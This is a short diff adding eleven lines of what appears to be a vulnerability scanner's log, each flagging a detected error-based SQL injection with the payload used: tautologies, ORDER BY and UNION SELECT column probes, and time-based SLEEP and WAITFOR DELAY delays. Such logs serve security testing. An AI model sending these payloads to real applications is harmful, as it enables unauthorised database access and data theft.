@@ -1,0 +1,11 @@
+[2026-06-03 16:45:57] [!] Error-based SQLi detected: ' OR 1=1--
+[2026-06-03 16:45:57] [!] Error-based SQLi detected: ' OR 'x'='x
+[2026-06-03 16:45:57] [!] Error-based SQLi detected: 1' OR '1'='1
+[2026-06-03 16:45:57] [!] Error-based SQLi detected: ' OR '1'='1'--
+[2026-06-03 16:45:57] [!] Error-based SQLi detected: 1 OR 1=1
+[2026-06-03 16:45:58] [!] Error-based SQLi detected: ' ORDER BY 1--
+[2026-06-03 16:45:58] [!] Error-based SQLi detected: ' ORDER BY 2--
+[2026-06-03 16:45:58] [!] Error-based SQLi detected: ' UNION SELECT 1,2--
+[2026-06-03 16:45:58] [!] Error-based SQLi detected: ' UNION SELECT 1,2,3--
+[2026-06-03 16:45:58] [!] Error-based SQLi detected: ' AND SLEEP(5)--
+[2026-06-03 16:45:59] [!] Error-based SQLi detected: 1'; WAITFOR DELAY '0:0:5'--
